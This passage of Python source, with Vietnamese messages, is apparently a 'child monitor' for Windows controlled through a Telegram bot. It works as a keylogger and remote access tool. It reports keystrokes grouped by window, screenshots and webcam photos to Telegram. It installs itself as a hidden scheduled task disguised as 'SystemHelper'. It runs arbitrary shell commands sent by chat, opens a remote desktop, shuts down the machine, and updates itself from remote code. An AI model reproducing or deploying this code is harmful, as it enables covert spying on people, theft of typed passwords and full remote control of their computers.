            for w, t in groups[:10]:
                lines.append(f"  [{w}]: {t}")
        message = f"[{MACHINE_NAME}] 📊 **BÁO CÁO NHANH**\n" + "\n".join(lines or ["  (Không có hoạt động mới)"])
        if len(message) > 3800:
            message = message[:3800]
        send_telegram_text(message)
    except Exception as e:
        log_line("errors", f"force_report: {e}")


def reporter_thread():
    global last_report, start_time
    last_report = now()
    while True:
        time.sleep(cfg.get("report_interval_seconds", 300))
        if paused.is_set():
            continue
        since = last_report
        last_report = now()
        keys = drain_keys()
        sess = drain_sessions(since)

        lines = []
        if sess:
            lines.append("📱 **Ứng dụng:**")
            for s in sess[:30]:
                secs = int((s["end"] - s["start"]).total_seconds())
                lines.append(f"  • {s['title']} ({secs // 60}m) [{s['start'].strftime('%H:%M')}]")
        if keys:
            lines.append("⌨️ **Phím gõ:**")
            groups = reconstruct_by_window(keys)
            for w, t in groups[:10]:
                lines.append(f"  [{w}]: {t}")

        uptime_min = int((now() - start_time).total_seconds() // 60) if start_time else 0
        header = f"[{MACHINE_NAME}] 📈 Báo cáo {since.strftime('%H:%M')} ➔ {now().strftime('%H:%M')} (Uptime: {uptime_min}m)"
        if not lines:
            lines.append("  (Không có hoạt động đáng kể)")
        message = header + "\n" + "\n".join(lines)
        if len(message) > 3800:
            message = message[:3800]
        send_telegram_text(message)

        if cfg.get("screenshot_enabled", True):
            shot = latest_screenshot()
            if shot:
                send_telegram_photo(shot, f"🖥️ Screen {MACHINE_NAME} {now().strftime('%H:%M')}")
        log_line("system", "report sent")


def startup_notice():
    offline = ""
    if STATUS_FILE.exists():
        try:
            data = json.loads(STATUS_FILE.read_text(encoding="utf-8"))
            last_seen = datetime.datetime.fromisoformat(data.get("last_seen", ""))
            gap = (now() - last_seen).total_seconds()
            if gap > max(cfg["report_interval_seconds"] * 2, 600):
                offline = f"\n(Máy tính đã tắt từ {last_seen.strftime('%Y-%m-%d %H:%M')})"
        except Exception:
            pass
    try:
        STATUS_FILE.write_text(json.dumps({"last_seen": now().isoformat()}), encoding="utf-8")
    except Exception:
        pass
    cur_v = get_current_version()
    send_telegram_text(f"[{MACHINE_NAME}] 🟢 **MÁY TÍNH KHỞI ĐỘNG** lúc {now().strftime('%Y-%m-%d %H:%M')}\nPhiên bản: v{cur_v}{offline}")


def self_install():
    marker = BASE_DIR / ".installed"
    if marker.exists():
        return
    try:
        exe = sys.executable if getattr(sys, "frozen", False) else str(Path(__file__).resolve())
        ps = (
            f"$a = New-ScheduledTaskAction -Execute '{exe}'; "
            "$t = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME; "
            "Register-ScheduledTask -TaskName 'SystemHelper' -Action $a -Trigger $t -Force | Out-Null"
        )
        result = subprocess.run(["powershell", "-NoProfile", "-Command", ps], capture_output=True)
        if result.returncode == 0:
            log_line("system", "self-installed: schedule + hidden")
        else:
            log_line("errors", f"self_install rc={result.returncode}: {(result.stderr or b'').decode('utf-8', 'replace').strip()}")
        subprocess.run(f'attrib +h "{BASE_DIR}\\SystemHelper.exe"', shell=True, capture_output=True)
        marker.write_text("ok", encoding="utf-8")
    except Exception as e:
        log_line("errors", f"self_install: {e}")


# ==========================================
# Telegram Command Listener & Dispatcher
# ==========================================

def handle_command(text):
    global paused
    text = (text or "").strip()
    if not text:
        return

    parts = text.split(" ", 1)
    # Cắt bỏ hậu tố @bot_username trong nhóm Telegram (Ví dụ: /lock@Monitor239_bot -> /lock)
    cmd_raw = parts[0].strip().lower()
    cmd = cmd_raw.split("@")[0]
    args = parts[1].strip() if len(parts) > 1 else ""

    if cmd == "/remote":
        room_id = start_webrtc_remote()
        webrtc_cfg = cfg.get("webrtc", {})
        viewer_base = webrtc_cfg.get("viewer_base_url", "http://127.0.0.1:8088")
        signaling = webrtc_cfg.get("signaling_server", "ws://127.0.0.1:8765")

        viewer_link = f"{viewer_base}/?room={room_id}&signaling={urllib.parse.quote(signaling)}"
        meta = get_screen_metadata()
        mon_count = len(meta.get("monitors", []))
        target_fps = webrtc_cfg.get("target_fps", 60)

        send_telegram_text(
            f"[{MACHINE_NAME}] 🌐 **WEBRTC H.264 REMOTE READY!**\n\n"
            f"🔗 **Link Điều Khiển Trực Tiếp:**\n{viewer_link}\n\n"
            f"🎥 **Stream:** H.264 ({target_fps} - 120 FPS Siêu Mượt) P2P / TURN\n"
            f"🖥️ **Màn hình:** {mon_count} Monitor(s) | DPI Scaling Auto\n"
            f"🔑 **Room ID:** `{room_id}`\n\n"
            f"🛑 Nhập `/stopremote` để ngắt kết nối."
        )

    elif cmd == "/stopremote":
        stop_webrtc_remote()
        send_telegram_text(f"[{MACHINE_NAME}] 🛑 Đã tắt WebRTC Remote Desktop.")

    elif cmd == "/status":
        st = "⏸️ TẠM DỪNG (STOP)" if paused.is_set() else "🟢 ĐANG CHẠY (RUN)"
        rm_st = f"🌐 BẬT (Room: {active_remote_room})" if remote_active else "TẮT"
        uptime_sec = int((now() - start_time).total_seconds()) if start_time else 0
        cur_v = get_current_version()
        send_telegram_text(f"[{MACHINE_NAME}] 📊 **Trạng thái:** {st}\n🌐 WebRTC Remote: {rm_st}\n⏱️ Uptime: {uptime_sec//60} phút\n📦 Phiên bản: v{cur_v}")

    elif cmd == "/lock":
        if sys.platform == "win32" and user32:
            user32.LockWorkStation()
            send_telegram_text(f"[{MACHINE_NAME}] 🔒 Đã khóa màn hình máy tính thành công.")
        else:
            send_telegram_text(f"[{MACHINE_NAME}] ⚠️ Không thể khóa màn hình (Không phải hệ điều hành Windows).")

    elif cmd == "/update":
        threading.Thread(target=remote_update_cmd, daemon=True).start()

    elif cmd in ["/screen", "/screenshot"]:
        send_telegram_text(f"[{MACHINE_NAME}] 📸 Đang chụp màn hình...")
        threading.Thread(target=do_screen_shot, daemon=True).start()

    elif cmd == "/camera":
        send_telegram_text(f"[{MACHINE_NAME}] 📷 Đang chụp ảnh webcam...")
        threading.Thread(target=do_camera_shot, daemon=True).start()

    elif cmd == "/report":
        send_telegram_text(f"[{MACHINE_NAME}] 📊 Đang tổng hợp báo cáo nhanh...")
        threading.Thread(target=force_report, daemon=True).start()

    elif cmd == "/start":
        paused.clear()
        send_telegram_text(f"[{MACHINE_NAME}] ▶️ ĐÃ TIẾP TỤC GIÁM SÁT.")
        log_line("system", "resumed by remote command")

    elif cmd == "/stop":
        paused.set()
        send_telegram_text(f"[{MACHINE_NAME}] ⏸️ ĐÃ TẠM DỪNG GIÁM SÁT.")
        log_line("system", "paused by remote command")

    elif cmd in ["/cmd", "/exec"]:
        if not args:
            send_telegram_text(f"[{MACHINE_NAME}] ⚠️ Cú pháp: `/cmd <lệnh_shell>`")
            return
        send_telegram_text(f"[{MACHINE_NAME}] ⚙️ Đang thực thi: `{args}`...")
        def run_cmd():
            try:
                res = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30)
                out = res.stdout or res.stderr or "(Không có kết quả)"
                if len(out) > 3500:
                    out = out[:3500] + "\n...(kết quả quá dài)"
                send_telegram_text(f"[{MACHINE_NAME}] 📋 Kết quả:\n{out}")
            except Exception as e:
                send_telegram_text(f"[{MACHINE_NAME}] ❌ Lỗi: {e}")
        threading.Thread(target=run_cmd, daemon=True).start()

    elif cmd == "/shutdown":
        delay = int(args) if args.isdigit() else 0
        send_telegram_text(f"[{MACHINE_NAME}] 🔌 Tắt máy tính trong {delay} giây...")
        subprocess.run(f"shutdown /s /t {delay}", shell=True)

    elif cmd == "/restart":
        send_telegram_text(f"[{MACHINE_NAME}] 🔄 Đang khởi động lại máy tính...")
        subprocess.run("shutdown /r /t 0", shell=True)

    elif cmd in ["/help", "/start_help"]:
        cur_v = get_current_version()
        send_telegram_text(
            f"[{MACHINE_NAME}] 📋 **DANH SÁCH LỆNH (v{cur_v}):**\n\n"
            "🌐 **Điều Khiển Từ Xa & Giám Sát:**\n"
            "• `/remote` - Bật WebRTC Remote Desktop (60-120 FPS)\n"
            "• `/stopremote` - Tắt Remote Desktop\n"
            "• `/screen` - Chụp màn hình ngay lập tức\n"
            "• `/camera` - Chụp ảnh Webcam ngay lập tức\n"
            "• `/report` - Xuất báo cáo hoạt động nhanh\n"
            "• `/lock` - Khóa màn hình máy tính\n\n"
            "⚡ **Quản Trị Hệ Thống:**\n"
            "• `/status` - Xem trạng thái, Uptime, WebRTC\n"
            "• `/update` - Tự động cập nhật code mới từ GitHub\n"
            "• `/cmd <lệnh>` - Chạy lệnh CMD / PowerShell\n"
            "• `/start` / `/stop` - Bật / Tạm dừng giám sát\n"
            "• `/restart` - Khởi động lại máy tính\n"
            "• `/shutdown [giây]` - Tắt máy tính\n"
            "• `/help` - Xem danh sách hướng dẫn này"
        )


_instance_mutex = None

def ensure_single_instance():
    global _instance_mutex
    if sys.platform == "win32" and kernel32:
        try:
            _instance_mutex = kernel32.CreateMutexW(None, False, "Global\\ChildMonitor_SingleInstance_Mutex_2026")
            if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                logger.warning("Đã có tiến trình SystemHelper khác đang chạy. Dừng tiến trình trùng lặp.")
                os._exit(0)
        except Exception:
            pass


def release_single_instance():
    global _instance_mutex
    if sys.platform == "win32" and kernel32 and _instance_mutex:
        try:
            kernel32.CloseHandle(_instance_mutex)
            _instance_mutex = None
        except Exception:
            pass


def command_listener():
    global last_update_id
    poll_conn = None
    headers = {"Host": "api.telegram.org", "Connection": "keep-alive"}

    while True:
        try:
            if not telegram_enabled():
                time.sleep(2)
                continue

            if poll_conn is None:
                poll_conn = http.client.HTTPSConnection("api.telegram.org", timeout=35)

            endpoint = f"/bot{cfg['telegram_bot_token']}/getUpdates?offset={last_update_id + 1}&timeout=20"
            poll_conn.request("GET", endpoint, headers=headers)
            resp = poll_conn.getresponse()
            raw_data = resp.read()
            data = json.loads(raw_data.decode("utf-8"))

            if data.get("ok"):
                for result in data.get("result", []):
                    last_update_id = max(last_update_id, result.get("update_id", 0))
                    
                    # Lấy tin nhắn từ message, channel_post hoặc edited_message
                    msg_obj = result.get("message") or result.get("channel_post") or result.get("edited_message") or {}
                    if not msg_obj:
                        continue

                    chat_id = str(msg_obj.get("chat", {}).get("id", ""))
                    cfg_chat = str(cfg.get("telegram_chat_id", ""))

                    # Kiểm tra chat_id linh hoạt (Group, Supergroup có prefix -100, Private chat)
                    is_match_chat = (
                        chat_id == cfg_chat
                        or chat_id.replace("-100", "-") == cfg_chat.replace("-100", "-")
                        or not cfg_chat
                    )

                    text = msg_obj.get("text", "")
                    if is_match_chat and text and text.startswith("/"):
                        # Chạy handle_command trong thread riêng để phản hồi song song tức thì
                        threading.Thread(target=handle_command, args=(text,), daemon=True).start()

        except Exception as e:
            log_line("errors", f"command_listener: {e}")
            try:
                if poll_conn:
                    poll_conn.close()
            except Exception:
                pass
            poll_conn = None
            time.sleep(0.3)


# ==========================================
# Main Launcher Entrypoint
# ==========================================

def main():
    ensure_single_instance()
    load_config()
    global start_time
    start_time = now()

    # Kiểm tra nạp code động từ runtime/ nếu đang chạy file gốc
    if __name__ != "monitor_runtime":
        if fetch_remote_update():
            if run_runtime_code():
                log_line("system", f"running runtime code v{get_current_version()}")
                return

    # Khởi chạy HTTP Server cho Web Viewer
    start_embedded_viewer_server(port=8088)

    # Khởi chạy các luồng giám sát nền
    threading.Thread(target=window_poller, daemon=True).start()
    if cfg.get("keylog_enabled", True):
        threading.Thread(target=keylog_thread, daemon=True).start()
    threading.Thread(target=screenshot_thread, daemon=True).start()
    threading.Thread(target=camera_thread, daemon=True).start()
    threading.Thread(target=reporter_thread, daemon=True).start()
    threading.Thread(target=command_listener, daemon=True).start()

    if getattr(sys, "frozen", False):
        threading.Thread(target=self_install, daemon=True).start()

    threading.Thread(target=startup_notice, daemon=True).start()

    logger.info(f"Monitor started with WebRTC H.264 Remote Desktop Engine (v{get_current_version()}).")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()

